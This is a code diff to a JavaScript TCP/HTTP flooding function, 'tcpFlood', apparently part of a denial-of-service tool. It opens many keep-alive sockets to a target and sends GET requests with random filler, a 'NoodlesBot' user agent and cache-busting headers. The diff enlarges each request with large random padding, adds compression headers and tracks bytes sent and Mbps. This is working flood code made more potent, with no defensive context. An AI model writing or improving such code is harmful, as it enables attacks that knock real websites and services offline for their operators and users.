@@ -40,15 +40,16 @@ async function tcpFlood(target, port = 80, threads = 10, duration = 60, statusCa
   let floodActive = true;
   let packetsSent = 0;
   let intervalIds = [];
+  let bytesSent = 0;
 
   function removeSocket(socket, index) {
     if (index > -1) {
       sockets.splice(index, 1);
     }
     try {
-        socket.destroy();
+      socket.destroy();
     } catch (e) {
-        console.error("Error destroying socket:", e)
+      console.error("Error destroying socket:", e);
     }
   }
 
@@ -74,15 +75,33 @@ async function tcpFlood(target, port = 80, threads = 10, duration = 60, statusCa
           }
 
           try {
-            const payload = "GET / HTTP/1.1\r\n" +
+            let payload = "GET / HTTP/1.1\r\n" +
               "Host: " + target + "\r\n" +
               "Connection: keep-alive\r\n" +
               "User-Agent: NoodlesBot\r\n" +
+              "Cache-Control: no-cache\r\n" + // Add no-cache header
+              "Accept-Encoding: gzip, deflate, br\r\n" + // Request compressed content
               "X-Filler: " + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + "\r\n" +
               "\r\n";
+
+            // Increase payload size with random data
+            const randomData = Math.random().toString(36).repeat(500); // Adjust repeat value as needed
+            payload += randomData;
+
             socket.write(payload);
             packetsSent++;
-            if (statusCallback) statusCallback({ status: 'packet_sent', packets: packetsSent, mbps: (packetsSent * payload.length / 1000000) / ((Date.now() - startTime) / 1000) });
+            bytesSent += payload.length; // Track total bytes sent
+
+            const elapsedTime = (Date.now() - startTime) / 1000;
+            const mbps = (bytesSent / 1000000) / elapsedTime;
+
+            if (statusCallback) {
+              statusCallback({
+                status: 'packet_sent',
+                packets: packetsSent,
+                mbps: mbps.toFixed(2) // MBPS with 2 decimal places
+              });
+            }
 
           } catch (err) {
             console.error(`Thread ${i + 1}: Error sending data: ${err.message}`);
